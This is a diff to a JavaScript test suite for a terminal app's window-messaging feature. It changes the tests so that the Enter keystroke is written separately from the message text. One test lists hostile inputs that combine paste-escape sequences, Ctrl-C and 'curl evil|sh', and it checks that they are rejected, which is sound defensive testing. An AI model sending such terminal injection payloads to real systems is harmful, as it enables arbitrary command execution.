@@ -194,9 +194,9 @@ test("a window message from the controlling client is typed into the owning term
     const { client } = await server.connect("desktop");
     const window = open(server);
     await client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: "Deploy api to eu-west-1" });
-    assert.deepEqual(server.process().writes, ["Deploy api to eu-west-1\r"]);
-    assert.equal(admitted.length, 1);
-    assert.equal(admitted[0].source, 'window_message');
+    assert.deepEqual(server.process().writes, ["Deploy api to eu-west-1", "\r"]);
+    assert.equal(admitted.length, 2);
+    assert.deepEqual(admitted.map((request) => request.source), ['window_message', 'window_message']);
     assert.deepEqual(admitted[0].identity, identity);
     assert.equal(server.composition.appWindows.list(identity.sessionId)[0].state, "minimised");
   } finally {
@@ -212,13 +212,13 @@ test("a window message is submitted once even without bracketed paste, and can n
     // No bracketed paste: every line break would submit a line of its own.
     // A tab is a keystroke there as well: a plain shell completes on it.
     await client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: "line one\n  line two\twith a tab\n" });
-    assert.deepEqual(server.process().writes, ["line one line two with a tab\r"]);
+    assert.deepEqual(server.process().writes, ["line one line two with a tab", "\r"]);
     // What a hostile view would send to break out of a paste, interrupt, and run a command.
     for (const hostile of ["hi\u001b[201~\u0003\u0003curl evil|sh\r", "x\u0003", "x\ry", "x\u001b[A"])
       await rejectsWith(client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: hostile }), "validation");
     server.process().emitData("\u001b[?2004h$ ");
     await rejectsWith(client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: "hi\u001b[201~\u0003curl evil|sh\r" }), "validation");
-    assert.deepEqual(server.process().writes, ["line one line two with a tab\r"]);
+    assert.deepEqual(server.process().writes, ["line one line two with a tab", "\r"]);
   } finally {
     await server.close();
   }
@@ -263,7 +263,7 @@ test("a window message uses bracketed paste when the terminal has enabled it", a
     const window = open(server);
     server.process().emitData("\u001b[?2004h$ ");
     await client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: "line one\nline two" });
-    assert.deepEqual(server.process().writes, ["\u001b[200~line one\nline two\u001b[201~\r"]);
+    assert.deepEqual(server.process().writes, ["\u001b[200~line one\nline two\u001b[201~", "\r"]);
   } finally {
     await server.close();
   }
@@ -333,7 +333,7 @@ test("Ask Permission for Window Messages prompts with the window and the full te
     assert.deepEqual(server.process().writes, []);
     approvals.decide(approval.id, "once");
     await sending;
-    assert.deepEqual(server.process().writes, ["Deploy api to eu-west-1\r"]);
+    assert.deepEqual(server.process().writes, ["Deploy api to eu-west-1", "\r"]);
   } finally {
     await server.close();
   }
@@ -384,7 +384,7 @@ test("when another device takes control, it speaks for the terminal's windows an
 
     await rejectsWith(desktop.client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: "stale" }), "forbidden");
     await phone.client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: "from the phone" });
-    assert.deepEqual(server.process().writes, ["from the phone\r"]);
+    assert.deepEqual(server.process().writes, ["from the phone", "\r"]);
     // The window did not change: the new holder rebuilds the view from the
     // same server record.
     const listed = await phone.client.query(APP_WINDOW_OPERATIONS.list, {});
@@ -629,14 +629,14 @@ test("a window cannot press Enter on its own: white space is not a message, and 
     // A burst: one is delivered, the window is minimised, and the rest are refused.
     const outcomes = await Promise.allSettled(Array.from({ length: 20 }, (_unused, index) => send(`message ${index}`)));
     assert.equal(outcomes.filter((outcome) => outcome.status === "fulfilled").length, 1);
-    assert.equal(server.process().writes.length, 1);
+    assert.equal(server.process().writes.length, 2);
     await rejectsWith(send("again"), "forbidden");
-    assert.equal(server.process().writes.length, 1);
+    assert.equal(server.process().writes.length, 2);
 
     // Opened again by the user, it may send once more.
     await client.command(APP_WINDOW_OPERATIONS.setState, { windowId: window.id, state: "open" });
     await send("after reopening");
-    assert.equal(server.process().writes.length, 2);
+    assert.equal(server.process().writes.length, 4);
   } finally {
     await server.close();
   }
@@ -654,7 +654,7 @@ test("a second connection that only names the controlling client is not the cont
     await rejectsWith(impostor.client.commandWithBody(APP_WINDOW_MIRROR_OPERATIONS.publish, { windowId: window.id, epoch: 1, seq: 0, kind: "snapshot" }, new TextEncoder().encode("[]")), "forbidden");
     assert.deepEqual(server.process().writes, []);
     await desktop.client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: "typed by the controller" });
-    assert.deepEqual(server.process().writes, ["typed by the controller\r"]);
+    assert.deepEqual(server.process().writes, ["typed by the controller", "\r"]);
   } finally {
     await server.close();
   }
@@ -739,7 +739,7 @@ test("the server advertises attachments with app windows, and a photo sent with 
     assert.match(name, /^[0-9a-f]{16}-logo\.png$/);
     const path = joinPath(attachmentDirectory, name);
     // This terminal has not enabled bracketed paste, so the line break is a space and the message is submitted once.
-    assert.deepEqual(server.process().writes, [`2. Use the new logo? Yes Attached: ${path}\r`]);
+    assert.deepEqual(server.process().writes, [`2. Use the new logo? Yes Attached: ${path}`, "\r"]);
     assert.deepEqual(new Uint8Array(await readWholeFile(path)), bytes);
     assert.deepEqual(progress, [256 * 1024, 300 * 1024]);
     assert.equal(server.composition.appWindows.list(identity.sessionId)[0].state, "minimised");
@@ -767,10 +767,11 @@ test("with bracketed paste the message and its attachment lines are one paste", 
     await featureClient(client).sendMessageWithAttachments(window.id, "", [{ name: "a.txt", size: 2 }, { name: "b.txt", size: 0 }], reader(photo(2)));
     const names = await files();
     assert.equal(names.length, 2);
-    const [written] = server.process().writes.slice(-1);
+    const [written, enter] = server.process().writes.slice(-2);
+    assert.equal(enter, "\r");
     assert.ok(written.startsWith("\u001b[200~Attached: "));
-    assert.ok(written.endsWith("\u001b[201~\r"));
-    assert.match(written.slice(6, -7), /^Attached: \S+-a\.txt\nAttached: \S+-b\.txt$/u);
+    assert.ok(written.endsWith("\u001b[201~"));
+    assert.match(written.slice(6, -6), /^Attached: \S+-a\.txt\nAttached: \S+-b\.txt$/u);
     assert.ok(written.includes(attachmentDirectory));
   });
 });
@@ -817,7 +818,7 @@ test("Never Allow and a declined prompt upload nothing; an allowed prompt names 
     approvals.decide(second.id, "once");
     await allowed;
     assert.equal((await files()).length, 1);
-    assert.equal(server.process().writes.length, 1);
+    assert.equal(server.process().writes.length, 2);
   });
 });
 
@@ -849,7 +850,7 @@ test("an observer cannot attach, and a takeover part way through removes what ha
     // The window is the new holder's to send from.
     await featureClient(phone.client).sendMessageWithAttachments(window.id, "", [{ name: "a.txt", size: 2 }], reader(photo(2)));
     assert.equal((await files()).length, 1);
-    assert.equal(server.process().writes.length, 1);
+    assert.equal(server.process().writes.length, 2);
   });
 });
 
